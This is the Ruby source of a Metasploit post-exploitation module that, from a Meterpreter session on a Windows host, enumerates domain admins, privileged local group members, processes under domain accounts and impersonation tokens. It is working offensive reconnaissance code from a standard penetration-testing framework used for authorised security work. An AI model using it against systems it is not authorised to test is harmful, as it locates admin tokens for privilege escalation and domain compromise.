##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Enumerate Domain Tokens',
        'Description' => %q{
          This module enumerates domain account tokens, processes running under
          domain accounts, and domain users in the local Administrators, Users
          and Backup Operator groups.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
        'Platform' => [ 'win'],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              incognito_list_tokens
              stdapi_sys_config_getuid
            ]
          }
        }
      )
    )
  end

  def run
    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
    print_status("Running module against #{hostname} (#{session.session_host})")

    domain = get_domain_name

    fail_with(Failure::Unknown, 'Could not retrieve domain name. Is the host part of a domain?') unless domain

    @domain_admins = get_members_from_group('Domain Admins', domain) || []

    print_error("Could not retrieve '#{domain}\\Domain Admins' group members.") if @domain_admins.blank?

    netbios_domain_name = domain.split('.').first.upcase

    uid = client.sys.config.getuid
    if uid.starts_with?(netbios_domain_name)
      user = uid.split('\\')[1]
      print_good('Current session is running under a Domain Admin account') if @domain_admins.include?(user)
    end

    if domain_controller?
      if is_system?
        print_good('Current session is running as SYSTEM on a domain controller')
      elsif is_admin?
        print_good('Current session is running under a Local Admin account on a domain controller')
      else
        print_status('This host is a domain controller')
      end
    else
      if is_system?
        print_good('Current session is running as SYSTEM')
      elsif is_admin?
        print_good('Current session is running under a Local Admin account')
      end
      print_status('This host is not a domain controller')

      list_group_members(netbios_domain_name)
    end

    list_processes(netbios_domain_name)
    list_tokens(netbios_domain_name)
  end

  def list_group_members(domain)
    tbl = Rex::Text::Table.new(
      'Header' => 'Account in Local Groups with Domain Context',
      'Indent' => 1,
      'Columns' =>
      [
        'Local Group',
        'Member',
        'Domain Admin'
      ]
    )

    print_status('Checking local groups for Domain Accounts and Groups')

    [
      'Administrators',
      'Backup Operators',
      'Users'
    ].each do |group|
      group_users = get_members_from_localgroup(group)

      next unless group_users

      vprint_status("Group '#{group}' members: #{group_users.join(', ')}")

      group_users.each do |group_user|
        next unless group_user.include?(domain)

        user = group_user.split('\\')[1]
        tbl << [group, group_user, @domain_admins.include?(user)]
      end
    end

    print_line("\n#{tbl}\n")
  end

  def list_tokens(domain)
    tbl = Rex::Text::Table.new(
      'Header' => 'Impersonation Tokens with Domain Context',
      'Indent' => 1,
      'Columns' =>
      [
        'Token Type',
        'Account Type',
        'Account Name',
        'Domain Admin'
      ]
    )
    print_status('Checking for Domain group and user tokens')

    user_tokens = client.incognito.incognito_list_tokens(0)
    user_delegation = user_tokens['delegation'].split("\n")
    user_impersonation = user_tokens['impersonation'].split("\n")

    user_delegation.each do |dt|
      next unless dt.include?(domain)

      user = dt.split('\\')[1]
      tbl << ['Delegation', 'User', dt, @domain_admins.include?(user)]
    end

    user_impersonation.each do |dt|
      next if dt == 'No tokens available'
      next unless dt.include?(domain)

      user = dt.split('\\')[1]
      tbl << ['Impersonation', 'User', dt, @domain_admins.include?(user)]
    end

    group_tokens = client.incognito.incognito_list_tokens(1)
    group_delegation = group_tokens['delegation'].split("\n")
    group_impersonation = group_tokens['impersonation'].split("\n")

    group_delegation.each do |dt|
      next unless dt.include?(domain)

      user = dt.split('\\')[1]
      tbl << ['Delegation', 'Group', dt, @domain_admins.include?(user)]
    end

    group_impersonation.each do |dt|
      next if dt == 'No tokens available'
      next unless dt.include?(domain)

      user = dt.split('\\')[1]
      tbl << ['Impersonation', 'Group', dt, @domain_admins.include?(user)]
    end

    if tbl.rows.empty?
      print_status('No domain tokens available')
      return
    end

    print_line("\n#{tbl}\n")
  end

  def list_processes(domain)
    tbl = Rex::Text::Table.new(
      'Header' => 'Processes under Domain Context',
      'Indent' => 1,
      'Columns' =>
      [
        'Process Name',
        'PID',
        'Arch',
        'User',
        'Domain Admin'
      ]
    )
    print_status('Checking for processes running under domain user')
    client.sys.process.processes.each do |p|
      next unless p['user'].include?(domain)

      user = p['user'].split('\\')[1]
      tbl << [
        p['name'],
        p['pid'],
        p['arch'],
        p['user'],
        @domain_admins.include?(user)
      ]
    end

    if tbl.rows.empty?
      print_status('No processes running as domain users')
      return
    end

    print_line("\n#{tbl}\n")
  end
end
